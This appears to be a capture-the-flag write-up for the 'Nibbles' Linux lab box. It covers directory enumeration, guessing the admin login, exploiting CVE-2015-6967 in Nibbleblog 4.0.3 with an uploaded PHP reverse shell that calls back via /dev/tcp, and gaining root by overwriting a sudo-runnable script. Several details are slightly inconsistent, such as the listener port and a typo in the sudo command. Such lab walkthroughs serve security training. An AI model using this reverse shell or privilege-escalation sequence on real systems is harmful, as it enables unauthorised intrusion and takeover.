# Nibbles (Linux)

# nmap 
22
80

# http
Blank website that says Hello World!
Inspected the web page source and found this:
 /nibbleblog/ directory. Nothing interesting here!

 Nothing here

# ffuf
`ffuf -u http://10.10.10.75/nibbleblog/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt`
Results:
content                 [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 75ms]
themes                  [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 74ms]
admin                   [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 78ms]
plugins                 [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 76ms]
README                  [Status: 200, Size: 4628, Words: 589, Lines: 64, Duration: 79ms]
languages               [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 77ms]

In nibbleblog/content/private/config.xml I found type="string">admin@nibbles.com<

We also find it here http://10.10.10.75/nibbleblog/content/private/users.xml

Reading /README I found the version and also that this website uses .php
We can also confirm that with Wappalyzer

Decided to give another **ffuf** run, this time using `e .php` in the end of the command to look for **.php** files/directories.

We found a couple of interesting ones, but like always I decided to check **/admin.php** first.

We know that the username is admin. I first tried admin admin, then admin password. And after thinking about it for a couple seconds I remember seeing **@nibbles** as well.

I got in with admin nibbles. 

After exporing the admin webpage for a bit. I saw two main things; we can uplaod a file into plugins - MyImages and also in settings down below we see a version, Nibbleblog 4.0.3.

I found CVE-2015-6967:
Unrestricted file upload vulnerability in the My Image plugin in Nibbleblog before 4.0.5 allows remote administrators to execute arbitrary code by uploading a file with an executable extension, then accessing it via a direct request to the file in content/private/plugins/my_image/image.php.

From here we know we can possibly set up a revershell in this pay load and upload to MyImages.

rvshell.php
```
<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/your.vpn.ip.address/1234 0>&1'");
```

Uploaded it then headed to http://10.10.10.75/nibbleblog/content/private/plugins/my_image/ like the CVE said. 
I clicked on the **image.php** thus executing the payload on my machine; listening on port 7777 in my case. 

A quick whoami let's me know I am logged in as nibbler. 

Upgrade to a basic shell
`python3 -c "import pty; pty.spawn('/bin/bash')"`

`sudo -l`
Results:

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh

I headed over to the correct direcorty and I had t unzip personal.zip. From here we were able to get the full path to monitor.sh

Since nibbler has ownership of that file, we can overwrite its contents and leverage sudo privileges to spawn a Bash sub-process with root user access.
```
cd /home/nibbler/personal/stuff
cp monitor.sh monitor.sh.orig
echo '/bin/bash -ip' > monitor.sh
sudo ./monitor.shell
```

2. **Creating a Backup:**
   ```bash
   cp monitor.sh monitor.sh.orig
   ```
   - Creates a backup of `monitor.sh` named `monitor.sh.orig` to restore it later if needed.

3. **Replacing the Script Content:**
   ```bash
   echo '/bin/bash -ip' > monitor.sh
   ```
   - Overwrites `monitor.sh` with a single line:
     ```bash
     /bin/bash -ip
     ```
   - This command launches an interactive privileged (`-p`) Bash shell.

4. **Executing the Script as Root:**
   ```bash
   sudo ./monitor.sh
   ```
   - Runs `monitor.sh` with elevated privileges (if `sudo` is allowed without a password for this script or user).

---

### **Why This Works?**
1. **Writable Script with `sudo` Execution:**
   - If `monitor.sh` is owned by your user (`nibbler`) but executed with `sudo`, you can modify its contents to execute arbitrary commands as root.

2. **Replacing the Script with a Bash Shell Command:**
   - By replacing `monitor.sh` with `/bin/bash -ip`, when `sudo ./monitor.sh` runs, it effectively spawns a root shell.

Once we execute the script as root I got the flag from **/root/root.txt**

PWNED!

### **Summary of the Nibbles (Linux) Hack:**
1. **Enumeration:**
   - Discovered `nibbleblog` directory via **nmap** and **ffuf**.
   - Identified **Nibbleblog 4.0.3** from `/README` and Wappalyzer.

2. **Gaining Initial Access:**
   - Found `admin@nibbles.com` in config and users XML files.
   - Logged into `/admin.php` using `admin:nibbles`.

3. **Exploiting File Upload Vulnerability (CVE-2015-6967):**
   - Uploaded a **PHP reverse shell** using the MyImages plugin.
   - Triggered shell execution by accessing `image.php`.

4. **Privilege Escalation:**
   - Found `sudo -l` allowed running `/home/nibbler/personal/stuff/monitor.sh` as root.
   - Overwrote `monitor.sh` to execute a **root shell**.
   - Used `sudo ./monitor.sh` to gain **root access**.

5. **Captured the Flag!** 🎉

---

### **Key Takeaways:**
- **Thorough Enumeration Wins:** Checking `/nibbleblog/` and `/admin.php` led to a valid login.
- **Try Default Credentials:** Found login with `admin:nibbles` by recognizing patterns in discovered information.
- **Read Publicly Accessible Files:** `/README`, `config.xml`, and `users.xml` revealed crucial info.
- **Leverage Known CVEs:** Found and exploited **CVE-2015-6967** for a reverse shell.
- **Check `sudo -l` for Privilege Escalation:** Found a writable script executed as root.
- **Modify Writable Scripts for Root Access:** Overwrote `monitor.sh` to spawn a root shell.

---

### **Things to Remember:**
- Use **ffuf** with extensions (`.php`) to uncover hidden files.
- Look for **config files** (`config.xml`, `users.xml`) for credentials.
- Check `/README` for **versions** and potential **exploits**.
- **File Upload Vulnerabilities** can lead to **Remote Code Execution**.
- **Writable scripts + sudo privileges** = **Easy root access**.
- Always **back up original files** before modifying them.

